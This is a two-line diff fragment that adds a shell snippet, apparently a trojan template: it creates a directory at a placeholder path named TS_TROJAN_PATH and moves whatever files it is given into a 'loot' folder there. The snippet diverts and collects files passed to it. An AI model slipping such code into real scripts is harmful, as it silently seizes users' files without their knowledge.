@@ -1,0 +1,2 @@
+mkdir -p #!TS_TROJAN_PATH!#
+mv $* #!TS_TROJAN_PATH!#/loot
